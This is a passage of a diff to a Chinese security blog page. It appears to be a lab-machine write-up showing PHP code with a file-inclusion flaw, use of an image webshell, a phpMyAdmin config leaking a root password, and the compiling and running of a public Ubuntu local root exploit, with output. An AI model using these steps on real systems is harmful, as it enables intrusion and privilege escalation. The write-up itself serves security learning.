&#123;</span><br><span class="line">       		include($dir.&apos;/&apos;.$choice.&apos;.php&apos;);</span><br><span class="line">			die();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">        if($choice===&apos;show&apos;)</span><br><span class="line">	&#123;</span><br><span class="line">        </span><br><span class="line">		include($dir.&apos;/&apos;.$choice.&apos;.php&apos;);</span><br><span class="line">		die();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		include($dir.&apos;/&apos;.$_POST[&apos;load&apos;]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那我们上传一个图片马上去，然后使用panel.php包含这个文件，成功获取到</p>
+<p><img src="http://ww1.sinaimg.cn/large/0078beR7ly1g0pxx2h437j30vp0fidhb.jpg" alt=""></p>
+<p>刚刚在网上找这类靶机的文章，发现一位大佬爆破出phpmy目录，然后通过猜解路径去下载，这个文件默认路径在/var/www/phpmy下面，那么我们还可以通过文件包含下载这个文件，然后获取到root账号和密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/* Servers configuration */</span><br><span class="line">$i = 0;</span><br><span class="line"></span><br><span class="line">/* Server: localhost [1] */</span><br><span class="line">$i++;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;verbose&apos;] = &apos;localhost&apos;;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;host&apos;] = &apos;localhost&apos;;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;port&apos;] = &apos;&apos;;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;socket&apos;] = &apos;&apos;;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;connect_type&apos;] = &apos;tcp&apos;;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;extension&apos;] = &apos;mysqli&apos;;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;auth_type&apos;] = &apos;cookie&apos;;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;user&apos;] = &apos;root&apos;;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;password&apos;] = &apos;roottoor&apos;;  //root密码</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;AllowNoPassword&apos;] = true;</span><br><span class="line"></span><br><span class="line">/* End of servers configuration */</span><br><span class="line"></span><br><span class="line">$cfg[&apos;DefaultLang&apos;] = &apos;en-utf-8&apos;;</span><br><span class="line">$cfg[&apos;ServerDefault&apos;] = 1;</span><br><span class="line">$cfg[&apos;UploadDir&apos;] = &apos;&apos;;</span><br><span class="line">$cfg[&apos;SaveDir&apos;] = &apos;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* rajk - for blobstreaming */</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;bs_garbage_threshold&apos;] = 50;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;bs_repository_threshold&apos;] = &apos;32M&apos;;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;bs_temp_blob_timeout&apos;] = 600;</span><br><span class="line">$cfg[&apos;Servers&apos;][$i][&apos;bs_temp_log_threshold&apos;] = &apos;32M&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Ubuntu本地提权："><a href="#Ubuntu本地提权：" class="headerlink" title="Ubuntu本地提权："></a>Ubuntu本地提权：</h3><p>那么使用xshell去远程连接目标服务器，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@indishell:~# uname -a</span><br><span class="line">Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux</span><br><span class="line"></span><br><span class="line">root@indishell:~# cat /etc/issue</span><br><span class="line">Ubuntu 12.04.5 LTS \n \l</span><br></pre></td></tr></table></figure>
+<p>看到是Ubuntu12.04版本的，那么可以利用Ubuntu著名的本地提权exp</p>
+<p>下载地址：<a href="https://www.exploit-db.com/exploits/37292" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/37292</a></p>
+<p>将EXP代码保存带文件内，然后赋予权限，进行编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@indishell:~# vim exp.c</span><br><span class="line">root@indishell:~# chmod 777 exp.c  //赋予权限</span><br><span class="line">root@indishell:~# gcc exp.c -o exp	//编译</span><br><span class="line">root@indishell:~# ls	</span><br><span class="line">exp  exp.c</span><br><span class="line">root@indishell:~# mv exp /home/ica/  </span><br><span class="line">root@indishell:~# su - ica   //由于是复现，我们切换用户为ica进行本地越权</span><br><span class="line">ica@indishell:~$</span><br><span class="line">ica@indishell:~$ ls</span><br><span class="line">exp</span><br><span class="line">ica@indishell:~$ ./exp  //执行EXP</span><br><span class="line">spawning threads</span><br><span class="line">mount #1</span><br><span class="line">mount #2</span><br><span class="line">child threads done</span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root)  groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),114(sambashare),1000(ica)       //成功越权</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -511,7 +521,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/手工挖掘漏洞/" rel="tag"><i class="fa fa-tag"></i> 手工挖掘漏洞</a>
+            <a href="/tags/靶机实验/" rel="tag"><i class="fa fa-tag"></i> 靶机实验</a>
           
         </div>
       
@@ -524,15 +534,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/03/03/SQLMAP/" rel="next" title="SQLMAP速查表">
+                <i class="fa fa-chevron-left"></i> SQLMAP速查表
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/23/WEB扫描工具之Nikto实践-1/" rel="prev" title="WEB扫描工具之Nikto实践">
-                WEB扫描工具之Nikto实践 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -790,7 +800,7 @@ show_date_time();
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#phpMyAdmin默认安装漏洞"><span class="nav-number">1.</span> <span class="nav-text">phpMyAdmin默认安装漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ubuntu-Debain默认安装PHP5-CGI漏洞"><span class="nav-number">2.</span> <span class="nav-text">Ubuntu/Debain默认安装PHP5-CGI漏洞</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#发现目标："><span class="nav-number">1.</span> <span class="nav-text">发现目标：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探测SQL注入漏洞："><span class="nav-number">2.</span> <span class="nav-text">探测SQL注入漏洞：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录爆破："><span class="nav-number">3.</span> <span class="nav-text">目录爆破：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含："><span class="nav-number">4.</span> <span class="nav-text">文件包含：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取shell："><span class="nav-number">5.</span> <span class="nav-text">获取shell：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu本地提权："><span class="nav-number">6.</span> <span class="nav-text">Ubuntu本地提权：</span></a></li></ol></div>
             
 
           </div>
